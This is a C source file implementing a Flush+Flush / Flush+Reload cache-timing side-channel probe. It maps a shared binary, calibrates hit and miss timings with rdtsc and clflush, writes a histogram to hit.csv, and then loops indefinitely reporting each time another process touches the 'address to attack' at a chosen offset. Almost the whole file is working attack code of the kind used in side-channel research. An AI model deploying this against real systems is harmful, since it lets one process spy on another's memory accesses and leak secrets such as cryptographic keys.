#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>

#define CTA_ASM_RDTSC_OP(instr) "mfence\n"\
				"lfence\n"\
				"rdtsc\n"\
				"lfence\n"\
				"movl %%eax, %%esi\n"\
				instr "\n"\
				"mfence\n"\
				"lfence\n"\
				"rdtsc\n"\
				"subl %%esi, %%eax\n"	

#define FLUSH_FLUSH_STR "clflush 0(%1)"

#define FLUSH_RELOAD_STR "movl (%1), %%eax"

#define MIN(x,y) x < y ? x : y

#define NUM_SAMPLES 10000000
#define MAX_TIMESTAMP 500

void flush_addr(void* addr) {

	asm volatile(
			"mfence\n"
			"lfence\n"
			"clflush 0(%0)\n"
			"lfence\n"
			:
			: "c"(addr)
			: "rax");
}

void access_addr(void* addr) {

	asm volatile(
			"mfence\n"
			"lfence\n"
			"movl (%0), %%eax\n"
			"lfence\n"
			:
			: "r"(addr)
			: "eax"
		);
}

unsigned int ff(void* addr){

	volatile unsigned int time=0;

	asm volatile (
			CTA_ASM_RDTSC_OP(FLUSH_FLUSH_STR)

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

unsigned int fr(void* addr){
	
	volatile unsigned int time=0;
	asm volatile (
			CTA_ASM_RDTSC_OP(FLUSH_RELOAD_STR)
			"clflush 0(%1)\n"

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

int main(int argc, char** argv){

	if( argc < 3 ) printf("2 arguments must be given\n");

	unsigned int (*choosen_func)(void* addr)=ff;

	int fd = open(argv[1], O_RDONLY);
	size_t map_size = lseek(fd, 0L, SEEK_END);

	if( !map_size || fd == -1 ){

		fprintf(stderr, "Couldn't open file!\n");
		exit(1);
	}

	printf("binary opened!\n");

	unsigned int page_size = sysconf(_SC_PAGE_SIZE);

	if( map_size & page_size ){

		map_size |= page_size;
		map_size++;
	}

	void* base_address = mmap(NULL, map_size, PROT_READ, MAP_SHARED, fd, 0);

	printf("binary allocated!\n");

	unsigned int offset;
	if(!sscanf(argv[2], "%x", &offset)){
	
		fprintf(stderr, "Couldn't parse offset!\n");
		exit(1);
	}

	printf("offset parsed! 0x%x\n", offset);

	void* addr = (char*)base_address + offset;

	printf("address to attack: %p\n", addr);
	printf("base address: %p\n", base_address);

	unsigned int hit_miss[MAX_TIMESTAMP][2] ={{0,0}};

	unsigned int time=0;
	for(unsigned int i=0; i < NUM_SAMPLES; i++){

		access_addr(addr);
		time = choosen_func(addr);
		hit_miss[MIN(time, MAX_TIMESTAMP-1)][0]++;

		flush_addr(addr);
		time = choosen_func(addr);
		hit_miss[MIN(time, MAX_TIMESTAMP-1)][1]++;
	}

	printf("data gathering done! Writing to file...\n");

	FILE* csv=fopen("hit.csv", "w");
	fprintf(csv, "timestamp, hit, miss\n");

	for(unsigned int i=0; i < MAX_TIMESTAMP; i++){

		fprintf(csv, "%u, %u, %u\n", i, hit_miss[i][0], hit_miss[i][1]);
	}

	fclose(csv);

	printf("wrote data to file!\n");

	unsigned int hit_begin=0;
	unsigned int hit_end=0;

	printf("hit_begin: ");
	scanf("%u", &hit_begin);

	printf("hit_end: ");
	scanf("%u", &hit_end);

	printf("(%u, %u)\n", hit_begin, hit_end);

	unsigned int counter=0;

	do{
	
		time = choosen_func(addr);
		if( hit_begin <= time && time <= hit_end )
			printf("accessed! time: %u, counter: %u\n", time, counter++);
	} while(1);

	close(fd);
	munmap(base_address, map_size);

	return 0;
}
